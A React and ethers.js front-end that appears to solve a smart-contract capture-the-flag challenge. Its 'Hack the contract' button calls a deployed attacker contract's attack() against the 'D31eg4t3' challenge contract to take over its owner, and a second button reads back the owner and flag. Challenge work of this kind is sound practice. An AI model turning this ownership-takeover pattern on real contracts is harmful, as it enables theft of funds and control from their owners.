import { ethers } from "ethers";
import React from "react";

const DELEGATE_CONTRACT_ADDRESS = "0x971e55F02367DcDd1535A7faeD0a500B64f2742d";
const DELEGATE_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "canYouHackMe",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "bytes",
        "name": "bites",
        "type": "bytes"
      }
    ],
    "name": "hackMe",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      },
      {
        "internalType": "bytes",
        "name": "",
        "type": "bytes"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "hacked",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];
const HACK_CONTRACT_ADDRESS = "0x4b81dfde17015db776D517d1396d9A1A0cBEb7E8";
const HACK_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract D31eg4t3",
        "name": "addr",
        "type": "address"
      }
    ],
    "name": "attack",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "canYouHackMe",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "addr",
        "type": "address"
      }
    ],
    "name": "changeOwner",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "addr",
        "type": "address"
      }
    ],
    "name": "changecanYouHackMe",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

const App = () => {

  const HackTheContract = async () => {

    try {
      console.log("Begin"); 
      const { ethereum } = window;
  
      if (ethereum) {
  
        const provider = new ethers.providers.Web3Provider(ethereum);
        const signer = provider.getSigner();
        const hackconnectedContract = new ethers.Contract(HACK_CONTRACT_ADDRESS, HACK_ABI, signer);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
  
        console.log("Connected", accounts[0]); 

        let attack = await hackconnectedContract.attack(DELEGATE_CONTRACT_ADDRESS);
        console.log("Change owner and the value of canYouHackMe: Process started");
        await attack.wait();
        console.log("Change owner and the value of canYouHackMe: Process fininshed");

      } 
      else {
        console.log("Ethereum object doesn't exist!");
      }
    } catch (error) {
      console.log(error)
    }
  
  }

    const Read = async () => {

      try {
        console.log("Begin");
        const { ethereum } = window;
    
        if (ethereum) {
    
          const provider = new ethers.providers.Web3Provider(ethereum);
          const delegateconnectedContract = new ethers.Contract(DELEGATE_CONTRACT_ADDRESS, DELEGATE_ABI, provider);
          const accounts = await ethereum.request({ method: "eth_requestAccounts" });
    
          console.log("Connected", accounts[0]); 
  
          await delegateconnectedContract.owner().then(owner => {
            console.log(`Current Owner: ${owner}`);
          });;

          await delegateconnectedContract.canYouHackMe(accounts[0]).then(boolValue => {
            console.log(`Boolean value of canYouHackMe for this connected address : ${boolValue}`);
          });;
  
        } 
        else {
          console.log("Ethereum object doesn't exist!");
        }
      } catch (error) {
        console.log(error)
      }


  }

  
  return (
    <div>
      <button onClick={() => HackTheContract().then(/* handle promise here */)}>Hack the contract</button>
      <button onClick={() => Read().then(/* handle promise here */)}>Read</button>
    </div>
  );
};

export default App;
